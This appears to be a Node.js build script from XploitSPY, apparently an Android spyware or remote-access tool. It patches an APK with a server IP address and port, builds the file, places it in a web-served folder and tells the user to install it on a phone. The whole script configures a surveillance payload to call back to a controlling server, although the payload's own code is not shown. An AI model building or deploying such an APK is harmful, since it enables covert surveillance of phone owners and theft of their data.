const apkBuilder = require('./includes/apkBuilder');

console.log('Building APK for your phone...');
console.log('Server IP: 192.168.1.101');
console.log('Server Port: 9400');

// Patch the APK with your server details
apkBuilder.patchAPK('192.168.1.101', 9400, (error) => {
    if (error) {
        console.error('Error patching APK:', error);
        return;
    }
    
    console.log('APK patched successfully!');
    console.log('Building APK...');
    
    // Build the APK
    apkBuilder.buildAPK((error) => {
        if (error) {
            console.error('Error building APK:', error);
            return;
        }
        
        console.log('APK built successfully!');
        console.log('APK location: server/assets/webpublic/XploitSPY.apk');
        console.log('You can now install this APK on your phone!');
    });
});
